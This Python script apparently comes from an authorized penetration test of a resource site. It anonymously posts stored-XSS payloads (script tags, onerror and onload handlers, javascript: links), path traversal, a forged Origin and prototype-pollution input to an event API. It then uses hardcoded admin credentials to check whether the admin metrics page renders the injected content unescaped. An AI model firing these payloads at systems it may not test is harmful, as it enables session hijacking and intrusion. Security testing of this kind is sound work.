#!/usr/bin/env python3
"""03 匿名写入面：指标接口与反馈接口的输入校验、存储型注入、后台呈现。"""
import json
import re
import sys

sys.path.insert(0, "/media/sunhao/F/Project/sanjiang-resources-site/reports/security/2026-10-21-attacker/scripts")
from probe_client import session, req, csrf_from, BASE, record

ADMIN = ("atk-admin", "Atk2026-Adm1n!x")
RES = {}
XSS = [
    ("script", "<script>alert('m1')</script>"),
    ("img", "<img src=x onerror=alert('m2')>"),
    ("svg", "<svg/onload=alert('m3')>"),
    ("attr", '"><img src=x onerror=alert("m4")>'),
    ("quote", '"><svg/onload=alert(1)>'),
    ("js-link", "[click](javascript:alert('m5'))"),
    ("entity", "<scr&#105;pt>alert('m6')</scr&#105;pt>"),
]


def note(k, v):
    RES[k] = v
    print(f"[{k}] {json.dumps(v, ensure_ascii=False)[:400]}")


def admin_session():
    s = session()
    s.post(BASE + "/api/login/", data={"username": ADMIN[0], "password": ADMIN[1]},
           headers={"Origin": BASE}, allow_redirects=False, timeout=20)
    return s


def main():
    anon = session()
    adm = admin_session()

    # 基线：后台指标页当前内容
    r = adm.get(BASE + "/admin/metrics/", timeout=20)
    base_txt = r.text
    note("metrics_base_status", r.status_code)
    note("metrics_base_has_table", ("Top" in base_txt or "搜索" in base_txt))

    # 1. 匿名写入 search_miss，target 为 HTML/脚本
    writes = []
    for label, payload in XSS:
        body = {"name": "search_miss", "target": payload}
        r = anon.post(BASE + "/api/event/", json=body, headers={"Origin": BASE},
                      allow_redirects=False, timeout=20)
        writes.append({"label": label, "payload": payload, "status": r.status_code,
                       "resp": r.text[:120]})
        record("event-search_miss-" + label, "POST", "/api/event/", r, {"Origin": BASE}, body)
    note("event_writes", writes)

    # 2. 其他事件名与 target 任意值
    other = []
    for name, target in [("detail_view", "<script>alert('v')</script>"),
                         ("guide_view", "../../etc/passwd"),
                         ("outbound_click", "https://evil.example/<img src=x onerror=alert(1)>"),
                         ("", "empty-name"),
                         ("search_miss", "A" * 300),
                         ("search_miss", "x"),
                         ("unknown_event", "y"),
                         ("search_miss", "多字节字符" * 30)]:
        body = {"name": name, "target": target}
        r = anon.post(BASE + "/api/event/", json=body, headers={"Origin": BASE},
                      allow_redirects=False, timeout=20)
        other.append({"name": name, "tlen": len(target), "status": r.status_code,
                      "resp": r.text[:100]})
        record("event-" + (name or "empty") + "-len" + str(len(target)), "POST", "/api/event/", r,
               {"Origin": BASE}, body)
    note("event_other", other)

    # 3. 事件接口的边界：无 Origin、异站 Origin、GET、错误的 JSON、超长
    edges = []
    cases = [
        ("no-origin", {}, {"name": "search_miss", "target": "no-origin"}),
        ("evil-origin", {"Origin": "https://evil.example"}, {"name": "search_miss", "target": "evil"}),
        ("bad-json", {"Origin": BASE, "Content-Type": "application/json"}, None),
        ("text-plain", {"Origin": BASE, "Content-Type": "text/plain"},
         json.dumps({"name": "search_miss", "target": "plain"})),
        ("array-name", {"Origin": BASE}, {"name": ["search_miss"], "target": "arr"}),
        ("proto", {"Origin": BASE}, {"name": "search_miss", "target": "p", "__proto__": {"x": 1}}),
    ]
    for label, hdrs, body in cases:
        if label == "bad-json":
            r = anon.post(BASE + "/api/event/", data="{not json", headers=hdrs,
                          allow_redirects=False, timeout=20)
        elif isinstance(body, str):
            r = anon.post(BASE + "/api/event/", data=body, headers=hdrs,
                          allow_redirects=False, timeout=20)
        else:
            r = anon.post(BASE + "/api/event/", json=body, headers=hdrs,
                          allow_redirects=False, timeout=20)
        edges.append({"case": label, "status": r.status_code, "resp": r.text[:100]})
        record("event-edge-" + label, "POST", "/api/event/", r, hdrs, body if not isinstance(body, str) else body[:80])
    r = anon.get(BASE + "/api/event/", allow_redirects=False, timeout=20)
    edges.append({"case": "GET", "status": r.status_code})
    record("event-get", "GET", "/api/event/", r)
    note("event_edges", edges)

    # 4. 后台指标页是否以原始 HTML 呈现注入内容
    r = adm.get(BASE + "/admin/metrics/", timeout=20)
    html = r.text
    found = {}
    for label, payload in XSS:
        keys = [payload, payload.replace("<", "&lt;")]
        found[label] = {
            "raw_payload": any(k in html for k in keys[:1]),
            "escaped": keys[1] in html,
        }
    note("metrics_render", found)
    # 抓取包含注入片段的上下文
    ctx = []
    for m in re.finditer(r"(?:onerror|<svg|<script|javascript:)", html):
        ctx.append(html[max(0, m.start() - 120):m.start() + 120])
        if len(ctx) >= 5:
            break
    note("metrics_dangerous_tokens", {"count": len(re.findall(r"onerror|<svg|<script|javascript:", html)),
                                     "contexts": ctx[:3]})
    record("admin-metrics-after-inject", "GET", "/admin/metrics/", r)

    with open("/tmp/sj-attacker/evidence/03-write-summary.json", "w") as f:
        json.dump(RES, f, ensure_ascii=False, indent=2)


if __name__ == "__main__":
    main()
